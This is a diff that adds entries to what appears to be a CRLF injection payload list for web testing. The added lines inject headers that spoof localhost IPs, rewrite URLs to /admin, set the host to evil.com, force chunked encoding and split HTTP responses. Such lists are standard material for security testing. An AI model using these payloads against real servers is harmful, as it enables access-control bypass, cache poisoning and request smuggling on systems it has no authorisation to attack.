@@ -23,3 +23,15 @@
 %0d%0a%20Set-Cookie:crlf=injection
 %0d%0a	Set-Cookie:crlf=injection
 %00%0d%0aSet-Cookie:crlf=injection
+%0d%0aX-Forwarded-For:127.0.0.1
+%0d%0aX-Real-IP:127.0.0.1
+%0d%0aX-Original-URL:/admin
+%0d%0aX-Rewrite-URL:/admin
+%0d%0aHost:evil.com
+%0d%0aX-Host:evil.com
+%0d%0aX-Forwarded-Host:evil.com
+%0d%0aTransfer-Encoding:chunked
+%0d%0aX-Forwarded-Scheme:https
+%0aX-Injected-Header:1
+%0dX-Injected-Header:1
+%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aX-Injected:1
